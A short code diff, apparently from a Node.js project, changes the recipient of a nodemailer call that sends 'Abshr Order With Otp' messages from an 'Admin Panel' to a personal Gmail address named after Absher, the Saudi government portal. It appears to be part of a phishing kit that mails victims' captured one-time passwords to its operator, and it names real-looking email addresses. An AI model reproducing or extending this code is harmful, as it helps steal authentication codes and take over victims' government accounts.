@@ -213,7 +213,7 @@ await transporter.sendMail({
 await transporter.sendMail({
     from: 'Admin Panel',
     // to: 'saudiabsher1990@gmail.com',
-    to: 'pnusds269@gmail.com',
+    to: 'saudiabsher1990@gmail.com',
     subject: `Abshr Order With Otp`,
     html: htmlContent
 }).then(info => {
